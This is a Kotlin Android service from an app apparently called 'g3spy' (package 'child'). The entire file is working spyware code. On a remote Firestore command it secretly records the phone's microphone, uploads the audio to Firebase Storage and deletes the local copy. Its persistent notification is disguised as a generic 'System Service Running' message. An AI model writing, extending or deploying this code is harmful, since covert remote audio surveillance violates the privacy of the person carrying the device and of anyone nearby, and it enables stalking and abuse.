package com.g3spy.child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.Uri
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class MicRecordingService : Service() {
    companion object {
        private const val TAG = "MicRecordingService"
        private const val NOTIFICATION_ID = 1005
        private const val CHANNEL_ID = "mic_recording_channel"
        private const val CHANNEL_NAME = "Microphone Recording"
        private const val DEFAULT_RECORDING_DURATION = 60000L 
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var storage: FirebaseStorage
    private var commandListener: ListenerRegistration? = null
    
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentRecordingFile: File? = null
    private var recordingStartTime: Long = 0
    
    private val executor = Executors.newSingleThreadExecutor()
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): MicRecordingService = this@MicRecordingService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        storage = FirebaseStorage.getInstance()
        
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        listenForRecordingCommands()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "MicRecordingService started")
        
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
        commandListener?.remove()
        executor.shutdown()
    }
    
    private fun createNotification(): Notification {
        
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun listenForRecordingCommands() {
        commandListener = firestore.collection("remote_commands")
            .whereEqualTo("command", "AUDIO_RECORD")
            .whereEqualTo("isExecuted", false)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen failed", e)
                    return@addSnapshotListener
                }
                
                snapshots?.documentChanges?.forEach { change ->
                    val command = change.document
                    Log.d(TAG, "Received audio recording command: ${command.id}")
                    
                    val params = command.get("params") as? Map<String, Any>
                    val durationMs = params?.get("durationMs") as? Long ?: DEFAULT_RECORDING_DURATION
                    
                    startRecording(durationMs) { success ->
                        if (success) {
                            
                            command.reference.update("isExecuted", true)
                        }
                    }
                }
            }
    }
    
    private fun startRecording(durationMs: Long, callback: (Boolean) -> Unit) {
        if (isRecording) {
            Log.d(TAG, "Already recording, stopping current recording first")
            stopRecording()
        }
        
        val audioFile = createAudioFile()
        currentRecordingFile = audioFile
        
        if (audioFile == null) {
            Log.e(TAG, "Failed to create audio file")
            callback(false)
            return
        }
        
        try {
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(audioFile.absolutePath)
                
                try {
                    prepare()
                    start()
                    
                    isRecording = true
                    recordingStartTime = System.currentTimeMillis()
                    Log.d(TAG, "Recording started, duration: ${durationMs}ms")
                    
                    executor.execute {
                        try {
                            Thread.sleep(durationMs)
                            
                            if (isRecording) {
                                stopRecording()
                                
                                uploadRecording(audioFile, (System.currentTimeMillis() - recordingStartTime).toInt() / 1000)
                            }
                        } catch (e: InterruptedException) {
                            Log.e(TAG, "Recording interrupted", e)
                        }
                    }
                    
                    callback(true)
                } catch (e: IOException) {
                    Log.e(TAG, "Failed to start recording", e)
                    callback(false)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing MediaRecorder", e)
            callback(false)
        }
    }
    
    private fun stopRecording() {
        if (isRecording) {
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false
                Log.d(TAG, "Recording stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping recording", e)
            }
        }
    }
    
    private fun createAudioFile(): File? {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "AUDIO_$timeStamp.mp4"
        
        var storageDir = getExternalFilesDir(null)
        
        if (storageDir == null || !storageDir.exists() || !storageDir.canWrite()) {
            Log.w(TAG, "External storage not available, falling back to internal storage")
            storageDir = filesDir
        }
        
        return try {
            if (!storageDir.exists() && !storageDir.mkdirs()) {
                Log.e(TAG, "Failed to create storage directory: ${storageDir.absolutePath}")
                null
            } else {
                File(storageDir, fileName)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create audio file", e)
            null
        }
    }
    
    private fun uploadRecording(file: File, durationSeconds: Int) {
        
        val timestamp = System.currentTimeMillis()
        val filename = "audio_${timestamp}.mp4"
        val storageRef = storage.reference.child("audio_recordings/$filename")
        
        val uploadTask = storageRef.putFile(Uri.fromFile(file))
        uploadTask.addOnSuccessListener {
            
            storageRef.downloadUrl.addOnSuccessListener { uri ->
                
                val recordingData = hashMapOf(
                    "audioUrl" to uri.toString(),
                    "timestamp" to Timestamp.now(),
                    "duration" to durationSeconds
                )
                
                firestore.collection("audio_recordings")
                    .add(recordingData)
                    .addOnSuccessListener { documentReference ->
                        Log.d(TAG, "Audio recording uploaded with ID: ${documentReference.id}")
                        
                        file.delete()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error uploading audio recording metadata", e)
                    }
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "Error uploading audio recording", e)
            file.delete()
        }
    }
}